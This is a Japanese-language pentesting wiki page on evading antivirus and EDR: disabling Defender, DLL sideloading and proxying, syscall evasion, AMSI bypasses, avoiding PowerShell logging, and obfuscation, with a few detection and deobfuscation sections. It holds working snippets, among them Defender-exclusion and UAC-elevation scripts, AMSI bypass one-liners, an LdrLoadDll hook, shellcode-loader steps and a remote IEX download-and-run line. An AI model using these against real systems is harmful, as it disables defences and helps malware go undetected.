# Antivirus (AV) のバイパス

{{#include ../banners/hacktricks-training.md}}

**このページの初稿を執筆したのは** [**@m2rc_p**](https://twitter.com/m2rc_p)**です！**

## Defenderを停止する

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defenderの動作を停止するツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別のAVを装ってWindows Defenderの動作を停止するツール。
- [管理者権限がある場合にDefenderを無効化する](basic-powershell-for-pentesters/README.md)

### Defenderを改変する前に、インストーラー風にUACを促す

ゲームチートを装った公開ローダーは、署名のないNode.js/Nexeインストーラーとして配布されることが多く、最初に**ユーザーに昇格を求めてから**Defenderを無効化します。流れはシンプルです。

1. `net session`で管理者コンテキストを確認します。このコマンドは実行者が管理者権限を持つ場合にのみ成功するため、失敗すればローダーは標準ユーザーとして実行されています。
2. 元のコマンドラインを維持したまま、`RunAs`動詞を使ってただちに自身を再起動し、想定どおりUACの同意プロンプトを表示させます。

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

被害者はすでに「cracked」ソフトウェアをインストールしていると思っているため、通常はプロンプトを承認し、マルウェアに Defender のポリシーを変更するために必要な権限を与えてしまいます。<sup>[[26]](#references)</sup>

### すべてのドライブ文字に対する一律の `MpPreference` 除外設定

昇格後、GachiLoader 風のチェーンはサービスを完全に無効化するのではなく、Defender の死角を最大限に広げます。ローダーはまず GUI watchdog（`taskkill /F /IM SecHealthUI.exe`）を終了し、その後、すべてのユーザープロファイル、システムディレクトリ、リムーバブルディスクをスキャン対象外にする**極めて広範な除外設定**を追加します。

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

主な観察事項:

- ループはマウントされているすべてのファイルシステム（D:\、E:\、USBメモリなど）を走査するため、**今後ディスク上のどこに配置されたペイロードも無視されます**。
- `.sys` 拡張子の除外は将来を見越したものです。攻撃者は、Defenderに再度触れることなく、後から未署名ドライバーを読み込める選択肢を確保しています。
- すべての変更は `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` に保存されるため、後続の段階で除外設定の維持を確認したり、UACを再度トリガーせずに除外対象を拡張したりできます。

Defenderサービスは停止されないため、単純なヘルスチェックでは「ウイルス対策は有効」と報告され続けますが、実際にはリアルタイム検査がこれらのパスに適用されることはありません。<sup>[[26]](#references)</sup>

## **AV Evasionの方法論**

現在、AVはファイルが悪意のあるものかどうかを判断するために、静的検知、動的解析、さらに高度なEDRでは振る舞い分析など、さまざまな方法を使用しています。

### **静的検知**

静的検知では、バイナリやスクリプト内の既知の悪意ある文字列やバイト列を検出し、ファイル自体から情報（ファイルの説明、会社名、デジタル署名、アイコン、チェックサムなど）を抽出します。そのため、一般に公開されている既知のツールを使うと、すでに解析されて悪意あるものとして検出対象になっている可能性が高く、より簡単に検出されることがあります。この種の検知を回避する方法はいくつかあります。

- **暗号化**

バイナリを暗号化すれば、AVがプログラムを検知する方法はなくなりますが、プログラムを復号してメモリ上で実行するための何らかのloaderが必要になります。

- **難読化**

場合によっては、バイナリやスクリプト内の文字列をいくつか変更するだけでAVを回避できます。ただし、難読化する対象によっては時間のかかる作業です。

- **独自ツールの開発**

独自のツールを開発すれば、既知の不正なシグネチャは存在しませんが、多くの時間と労力が必要です。

> [!TIP]
> Windows Defenderの静的検知を確認するには、[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)がおすすめです。ファイルを複数のセグメントに分割し、それぞれをDefenderに個別にスキャンさせます。これにより、バイナリ内で検出対象となっている文字列やバイトを正確に特定できます。

実践的なAV Evasionについては、この[YouTubeプレイリスト](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)をぜひご覧ください。

### **動的解析**

動的解析では、AVがサンドボックス内でバイナリを実行し、悪意ある動作（ブラウザのパスワードを復号して読み取ろうとする、LSASSのminidumpを実行するなど）がないか監視します。この部分は少し対処が難しい場合がありますが、サンドボックスを回避するためにできることをいくつか紹介します。

- **実行前にスリープする** 実装方法によっては、AVの動的解析を回避する効果的な方法になります。AVがファイルをスキャンする時間は、ユーザーの作業を妨げないよう非常に短いため、長時間スリープさせるとバイナリの解析を妨げられます。ただし、多くのAVのサンドボックスでは、実装方法によってはスリープをスキップできます。
- **マシンのリソースを確認する** 通常、サンドボックスが利用できるリソースは非常に限られています（例：RAMが2GB未満）。そうしなければ、ユーザーのマシンの動作が遅くなる可能性があるためです。また、CPUの温度やファンの回転速度を確認するなど、工夫の余地もあります。サンドボックスではすべてが実装されているとは限りません。
- **マシン固有のチェック** 「contoso.local」ドメインに参加しているワークステーションを使うユーザーを標的にしたい場合は、コンピューターのドメインが指定したものと一致するか確認できます。一致しなければ、プログラムを終了させることができます。

Microsoft Defenderのサンドボックスのコンピューター名はHAL9THです。そのため、実行前にマルウェア内でコンピューター名を確認し、HAL9THと一致した場合はDefenderのサンドボックス内にいると判断して、プログラムを終了させることができます。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

サンドボックスに対処する際に役立つ、[@mgeeky](https://twitter.com/mariuszbit)によるその他のヒント

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-devチャンネル</p></figcaption></figure>

この記事で前述したように、**公開ツール**はいずれ**検出される**ため、次のことを自問してください。

たとえば、LSASSをダンプしたい場合、**本当にmimikatzを使う必要がありますか**？ それとも、知名度が低く、LSASSもダンプできる別のプロジェクトを使えますか？

おそらく、正解は後者です。mimikatzを例にとると、AVやEDRによって最も多く検出されているマルウェアの一つ、あるいは最も検出されているものと言ってもよいでしょう。プロジェクト自体は非常に優れていますが、AVを回避するために使うのは非常に厄介です。実現したいことに応じて、代替手段を探しましょう。

> [!TIP]
> 回避のためにpayloadを変更する場合は、Defenderの**サンプルの自動送信をオフにしてください**。また、長期的な回避を目指すのであれば、**絶対にVIRUSTOTALへアップロードしないでください**。特定のAVにpayloadが検出されるか確認したい場合は、VMにそのAVをインストールし、サンプルの自動送信をオフにしてから、結果に納得できるまでそこでテストしてください。

## EXEs vs DLLs

可能な限り、回避には常に**DLLの使用を優先してください**。私の経験では、DLLファイルは通常、**検出や解析を受ける可能性がかなり低い**ため、payloadをDLLとして実行する方法がある場合には、検出を避けるための非常に簡単な手段になります。

この画像にあるように、HavocのDLL Payloadはantiscan.meで検出率が4/26である一方、EXE payloadの検出率は7/26です。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>通常のHavoc EXE payloadと通常のHavoc DLLのantiscan.meでの比較</p></figcaption></figure>

次に、DLLファイルを使ってさらにステルス性を高めるためのテクニックを紹介します。

## DLL Sideloading & Proxying

**DLL Sideloading**では、loaderが使用するDLL検索順序を利用し、標的アプリケーションと悪意あるpayloadを同じ場所に配置します。

[Siofra](https://github.com/Cybereason/siofra)と次のpowershellスクリプトを使うと、DLL Sideloadingの影響を受けやすいプログラムを確認できます:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

このコマンドは、"C:\Program Files\\" 内で DLL hijacking の影響を受けるプログラムの一覧と、それらが読み込もうとする DLL ファイルを出力します。

**DLL Hijackable/Sideloadable なプログラムを自分で調査することを強くおすすめします**。この technique は適切に実行すればかなり stealthy ですが、公開されている DLL Sideloadable なプログラムを使うと、簡単に検知される可能性があります。

プログラムが読み込もうとする名前の悪意ある DLL を置くだけでは、payload は読み込まれません。プログラムは、その DLL 内に特定の関数があることを想定しているためです。この問題を解決するため、**DLL Proxying/Forwarding** という別の technique を使います。

**DLL Proxying** は、プログラムからの呼び出しを proxy (悪意ある) DLL から元の DLL に転送します。これにより、プログラムの機能を維持しながら、payload の実行を処理できます。

[@flangvik](https://twitter.com/Flangvik/) の [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project を使用します。

以下は、実行した手順です。

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

最後のコマンドを実行すると、2つのファイルが生成されます。DLLのソースコードテンプレートと、名前を変更した元のDLLです。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

これらが結果です:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

[SGN](https://github.com/EgeBalci/sgn)でエンコードしたshellcodeとproxy DLLのどちらも、[antiscan.me](https://antiscan.me)でのDetection rateは0/26です！成功と言えるでしょう。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloadingについて解説している[S3cur3Th1sSh1tのtwitch VOD](https://www.twitch.tv/videos/1644171543)と、[ippsecの動画](https://www.youtube.com/watch?v=3eROsG_WNpE)をぜひご覧ください。今回説明した内容をさらに詳しく学べます。

### Forwarded Exportsの悪用（ForwardSideLoading）

Windows PEモジュールは、実際には「forwarders」である関数をexportできます。コードを指す代わりに、exportエントリには`TargetDll.TargetFunc`形式のASCII文字列が格納されています。呼び出し元がこのexportを解決すると、Windows loaderは次の処理を行います。

- `TargetDll`がまだ読み込まれていない場合は読み込む
- `TargetFunc`をそこから解決する

理解しておくべき主な動作:
- `TargetDll`がKnownDLLの場合、保護されたKnownDLLs名前空間から提供されます（例: ntdll、kernelbase、ole32）。<sup>[[15]](#references)</sup>
- `TargetDll`がKnownDLLでない場合は、通常のDLL検索順序が使われます。この順序には、forward解決を行うモジュールのディレクトリも含まれます。

これにより、間接的なsideloadingの手法が可能になります。non-KnownDLLのモジュール名にforwardされる関数をexportする署名済みDLLを見つけ、その署名済みDLLと同じ場所に、forward先のモジュールと完全に同じ名前を付けた攻撃者制御のDLLを配置します。forwarded exportが呼び出されると、loaderはforwardを解決し、同じディレクトリからDLLを読み込んで、あなたのDllMainを実行します。<sup>[[13]](#references)</sup>

Windows 11で確認された例:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順序で解決されます。

PoC（コピーして貼り付け）:
1) 署名済みのシステム DLL を書き込み可能なフォルダーにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 同じフォルダーに悪意のある `NCRYPTPROV.dll` を配置します。コードを実行するには最小限の DllMain で十分です。DllMain をトリガーするために、転送先の関数を実装する必要はありません。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) 署名済みのLOLBinで転送をトリガーする：
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- (署名済みの) rundll32 が side-by-side の `keyiso.dll` (署名済み) を読み込む
- `KeyIsoSetAuditingInterface` の解決中、loader は forward をたどって `NCRYPTPROV.SetAuditingInterface` に進む
- loader はその後、`C:\test` から `NCRYPTPROV.dll` を読み込み、その `DllMain` を実行する
- `SetAuditingInterface` が実装されていない場合でも、`DllMain` の実行後に初めて "missing API" エラーが発生する

Hunting のヒント:
- 転送先の module が KnownDLL ではない forward された export に注目する。KnownDLL は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` に一覧表示されている。
- 次のようなツールを使って、forward された export を列挙できる:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 候補を検索するには、Windows 11 の forwarder inventory を参照してください: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

検知・防御のアイデア:
- LOLBins（例: rundll32.exe）がシステム外のパスから署名済み DLL を読み込み、その後、同じディレクトリから同じベース名の non-KnownDLLs を読み込む動作を監視する
- 次のようなプロセス／モジュールの連鎖を検知する: `rundll32.exe` → システム外の `keyiso.dll` → ユーザーが書き込み可能なパス配下の `NCRYPTPROV.dll`
- コード整合性ポリシー（WDAC/AppLocker）を適用し、アプリケーションディレクトリでの write+execute を禁止する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze は、suspended process、direct syscall、代替の実行方法を利用して EDR を回避するための payload toolkit です`

Freeze を使うと、ステルス性を保ちながら shellcode を読み込んで実行できます。

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasionはいたちごっこです。今日有効な手法が明日には検知される可能性があるため、1つのツールだけに頼らず、可能であれば複数のEvasion手法を組み合わせてください。

## Direct/Indirect Syscalls と SSN 解決 (SysWhispers4)

EDRは、`ntdll.dll` の syscall stub に **user-mode inline hook** を仕掛けることがよくあります。これらのhookを回避するには、正しい **SSN** (System Service Number) を読み込み、hookされたexportのentrypointを実行せずにkernel modeへ移行する **direct** または **indirect** syscall stubを生成できます。<sup>[[32]](#references)</sup>

**呼び出し方法:**
- **Direct (embedded)**: 生成されたstub内に `syscall`/`sysenter`/`SVC #0` 命令を出力します (`ntdll` のexportには触れません)。
- **Indirect**: `ntdll` 内に既存の `syscall` gadgetがある場所へjumpし、kernelへの移行が `ntdll` から行われたように見せます (heuristic evasionに有効です)。**randomized indirect** は呼び出しごとにpoolからgadgetを選択します。
- **Egg-hunt**: 静的な `0F 05` opcode sequenceをdisk上に埋め込まず、runtimeにsyscall sequenceを解決します。

**hookに耐性のあるSSN解決方法:**
- **FreshyCalls (VA sort)**: stubのbyteを読み取る代わりに、syscall stubをvirtual address順に並べてSSNを推定します。
- **SyscallsFromDisk**: クリーンな `\KnownDlls\ntdll.dll` をmapし、その `.text` からSSNを読み取ってからunmapします (memory上のすべてのhookを回避します)。
- **RecycledGate**: VA順のSSN推定と、stubがクリーンな場合のopcode validationを組み合わせます。hookされている場合はVA推定にfallbackします。
- **HW Breakpoint**: `syscall` 命令にDR0を設定し、VEHを使ってruntimeに `EAX` からSSNを取得します。hookされたbyteを解析する必要はありません。

SysWhispers4の使用例:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSIは「[ファイルレスマルウェア](https://en.wikipedia.org/wiki/Fileless_malware)」を防ぐために作られました。初期のAVは**ディスク上のファイル**しかスキャンできなかったため、何らかの方法でpayloadを**直接メモリ内で**実行できれば、AVは十分な可視性を持たず、それを防ぐことができませんでした。

AMSI機能は、Windowsの次のコンポーネントに統合されています。

- User Account Control、またはUAC（EXE、COM、MSI、ActiveXのインストール時の昇格）
- PowerShell（スクリプト、対話的な使用、動的コード評価）
- Windows Script Host（wscript.exeとcscript.exe）
- JavaScriptとVBScript
- Office VBAマクロ

スクリプトの内容を暗号化も難読化もされていない形式で公開することで、ウイルス対策ソリューションがスクリプトの動作を検査できるようにします。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`を実行すると、Windows Defenderで次のアラートが発生します。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:`に続いて、スクリプトを実行した実行ファイルのパスが付加されていることに注目してください。この場合はpowershell.exeです。

ディスクにはファイルを一切書き込みませんでしたが、AMSIによってメモリ内で検出されました。

さらに、**.NET 4.8**以降では、C#コードもAMSIを通して実行されます。これは、メモリ内で実行するために`Assembly.Load(byte[])`を使う場合にも影響します。そのため、AMSIを回避してメモリ内で実行したい場合は、古いバージョンの.NET（4.7.2以下など）の使用が推奨されます。

AMSIを回避する方法はいくつかあります。

- **Obfuscation**

AMSIは主に静的検出を行うため、読み込もうとするスクリプトを変更することは、検出を回避する有効な方法です。

ただし、AMSIには複数の層がある場合でもスクリプトの難読化を解除する機能があるため、難読化の方法によっては逆効果になることがあります。そのため、回避は簡単ではありません。一方、場合によっては変数名をいくつか変更するだけで十分なこともあるため、どの程度フラグが立てられているかによります。

- **AMSI Bypass**

AMSIはDLLをpowershell（cscript.exe、wscript.exeなども含む）プロセスに読み込むことで実装されているため、非特権ユーザーとして実行していても簡単に改ざんできます。AMSIの実装上のこの欠陥により、研究者たちはAMSIスキャンを回避する複数の方法を発見しました。

**エラーを強制的に発生させる**

AMSIの初期化を失敗させる（amsiInitFailed）と、現在のプロセスではスキャンが開始されません。この手法は当初、[Matt Graeber](https://twitter.com/mattifestation)によって公開され、Microsoftは広く使われるのを防ぐためのシグネチャを開発しました。

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

AMSIを無効化するには、現在のpowershellプロセスでpowershell codeを1行実行するだけで十分でした。もちろん、この行自体がAMSIによって検知されるため、この手法を使うには何らかの変更が必要です。

以下は、[Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)から引用した、改変済みのAMSI bypassです。

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep in mind, this will probably get flagged once this post is published, so you should not publish any code if your plan is to stay undetected.

**Memory Patching**

この手法は、[@RastaMouse](https://twitter.com/_RastaMouse/) によって最初に発見されました。ユーザーから提供された入力のスキャンを担当する amsi.dll 内の「AmsiScanBuffer」関数のアドレスを見つけ、E_INVALIDARG のコードを返す命令で上書きします。これにより、実際のスキャン結果は 0 となり、クリーンな結果として解釈されます。

> [!TIP]
> 詳細な説明については、[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) をお読みください。

powershell で AMSI をバイパスする手法は他にも多数あります。詳しくは[**こちらのページ**](basic-powershell-for-pentesters/index.html#amsi-bypass)と[**こちらのリポジトリ**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)をご覧ください。

### amsi.dll の読み込みを防いで AMSI をブロックする（LdrLoadDll hook）

AMSI は、現在のプロセスに `amsi.dll` が読み込まれた後にのみ初期化されます。堅牢で言語に依存しないバイパス方法は、`ntdll!LdrLoadDll` にユーザーモード hook を設定し、要求されたモジュールが `amsi.dll` の場合にエラーを返すことです。その結果、AMSI は読み込まれず、そのプロセスではスキャンが行われません。<sup>[[23]](#references)</sup>

実装の概要（x64 C/C++ 疑似コード）：
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell、WScript/CScript、カスタムローダーなど、AMSIを読み込むもの全般で動作します。
- stdin経由でスクリプトを渡す方法（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と組み合わせると、長いコマンドラインの痕跡を避けられます。
- LOLBins経由で実行されるローダー（例: `DllRegisterServer`を呼び出す`regsvr32`）での使用例があります。

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)**というツールも、AMSIをバイパスするスクリプトを生成します。
**[https://amsibypass.com/](https://amsibypass.com/)**というツールも、ランダム化されたユーザー定義関数、変数、文字式を使ってシグネチャを回避し、PowerShellキーワードの大文字・小文字をランダムに変更してシグネチャを回避するスクリプトを生成します。

**検出されたシグネチャを削除する**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)**や**[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**などのツールを使うと、現在のプロセスのメモリから検出されたAMSIシグネチャを削除できます。このツールは、現在のプロセスのメモリをスキャンしてAMSIシグネチャを探し、NOP命令で上書きすることで、メモリから実質的に削除します。

**AMSIを使用するAV/EDR製品**

AMSIを使用するAV/EDR製品の一覧は、**[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**で確認できます。

**PowerShell version 2を使用する**
PowerShell version 2を使用するとAMSIは読み込まれないため、AMSIのスキャンを受けずにスクリプトを実行できます。次のように実行できます。

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell loggingは、システム上で実行されたすべてのPowerShellコマンドをログに記録できる機能です。監査やトラブルシューティングに役立ちますが、**検出を回避したい攻撃者にとっては問題になる可能性があります**。

PowerShell loggingを回避するには、次の手法を使用できます。

- **PowerShell TranscriptionとModule Loggingを無効にする**: この目的には、[https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs)などのツールを使用できます。
- **PowerShell version 2を使用する**: PowerShell version 2ではAMSIが読み込まれないため、AMSIによるスキャンを受けずにスクリプトを実行できます。次のように実行できます: `powershell.exe -version 2`
- **unmanaged PowerShell sessionを使用する**: [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell)を使うと、`powershell.exe`を起動せずにPowerShellをホストできます（Cobalt Strikeの`powerpick`で使われている方法です）。これにより、`powershell.exe`プロセスに特化した制御は回避できますが、AMSI、Script Block Logging、その他すべてのPowerShell防御が自動的に無効になるわけではありません。適用範囲はランタイムとホストの実装によって異なります。


## Obfuscation

> [!TIP]
> いくつかのobfuscation手法ではデータを暗号化するため、バイナリのエントロピーが増加し、AVやEDRに検出されやすくなります。この点に注意し、機密性の高いコードや隠す必要があるコードの特定の部分にのみ暗号化を適用することを検討してください。

### ConfuserExで保護された.NETバイナリのDeobfuscation

ConfuserEx 2（または商用フォーク）を使用したマルウェアを解析する際は、デコンパイラやsandboxを妨げる複数の保護レイヤーに直面することがよくあります。以下のワークフローを使うと、**元の状態に近いILを確実に復元**でき、その後、dnSpyやILSpyなどのツールでC#にデコンパイルできます。<sup>[[10]](#references)</sup>

1.  Anti-tamperingの除去 – ConfuserExはすべての*method body*を暗号化し、*module*のstatic constructor（`<Module>.cctor`）内で復号します。また、PE checksumにもパッチを適用するため、変更を加えるとバイナリがクラッシュします。**AntiTamperKiller**を使って暗号化されたmetadata tableを特定し、XOR keyを復元して、クリーンなassemblyを書き出します。
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   出力には、独自のunpackerを作成する際に役立つ6つのanti-tamperパラメータ（`key0-key3`、`nameHash`、`internKey`）が含まれています。

2.  シンボル／制御フローの復元 – *clean*ファイルを**de4dot-cex**（ConfuserExに対応したde4dotのフォーク）に渡します。
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   フラグ:
     • `-p crx` – ConfuserEx 2 プロファイルを選択
     • de4dot は control-flow flattening を解除し、元の namespace、クラス、変数名を復元して、定数文字列を復号します。

3.  Proxy-call stripping – ConfuserEx は、逆コンパイルをさらに妨げるため、直接のメソッド呼び出しを軽量なラッパー（*proxy calls* とも呼ばれます）に置き換えます。**ProxyCall-Remover** で削除します。
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   この手順の後、`Class8.smethod_10` などの不透明なラッパー関数ではなく、`Convert.FromBase64String` や `AES.Create()` のような通常の .NET API が確認できるはずです。

4.  手動クリーンアップ – 生成されたバイナリを dnSpy で実行し、大きな Base64 blob や `RijndaelManaged`/`TripleDESCryptoServiceProvider` の使用箇所を検索して、*実際の* payload を特定します。多くの場合、マルウェアは `<Module>.byte_0` 内で初期化される TLV エンコード済みの byte 配列として payload を保存しています。

この一連の手順では、悪意のあるサンプルを実行せずに実行フローを復元できます。オフラインのワークステーションで作業する場合に便利です。

> 🛈  ConfuserEx は `ConfusedByAttribute` というカスタム属性を生成します。これは IOC として使用し、サンプルを自動的にトリアージできます。

#### ワンライナー
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトは、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>)と改ざん防止によってソフトウェアのセキュリティを高めることができる、[LLVM](http://www.llvm.org/)コンパイルスイートのオープンソースフォークを提供することを目的としています。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscatorは、外部ツールを使わず、コンパイラを変更することもなく、`C++11/14`言語を使ってコンパイル時に難読化コードを生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming frameworkで生成された難読化処理のレイヤーを追加し、アプリケーションをクラックしようとする者の作業を少し難しくします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatrazは、.exe、.dll、.sysなど、さまざまなPEファイルを難読化できるx64 binary obfuscatorです。
- [**metame**](https://github.com/a0rtega/metame): Metameは、任意の実行ファイルに対応するシンプルなmetamorphic codeエンジンです。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscatorは、ROP（return-oriented programming）を使用する、LLVM対応言語向けの細粒度なコード難読化フレームワークです。ROPfuscatorは、通常の命令をROP chainに変換することでアセンブリコードレベルでプログラムを難読化し、通常の制御フローに対する直感的な理解を妨げます。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcryptは、Nimで書かれた.NET PE Crypterです。
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptorは既存のEXE/DLLをshellcodeに変換し、ロードできます。

### LLVM compiler-assisted per-function self-masking

スリープ中にimplant全体をマスキングする代わりに、変更したLLVM X86 backendを使うと、選択した関数が非アクティブな間は常にXORでマスキングできます。Function Peekaboo PoCは、デマングルされた名前に`REG_`を含む関数を選択し、最終的なmachine codeの前後にposition-independentなentry/exit stubを挿入して、`.text`に共有のmasking handlerを1つ出力します。ソースレベルのシグネチャとWindows x64 calling conventionは変更されません。<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

この処理は、命令選択と最適化の後に行う必要があります。変換では**出力されるすべてのreturn**を対象にし、正確なx86レイアウトを把握する必要があるためです。出力前の`MachineFunctionPass`は、最後の`MachineInstr::isReturn()`を見つけて削除し、最終パスが追加したepilogueにフォールスルーするようにします。それ以前のreturnは`JMP_1 handler`に置き換えます。各returnの前にある、コンパイラが生成したスタックやフレームの後処理は残し、return命令そのものだけをリダイレクトします。<sup>[[38]](#references)[[39]](#references)</sup>

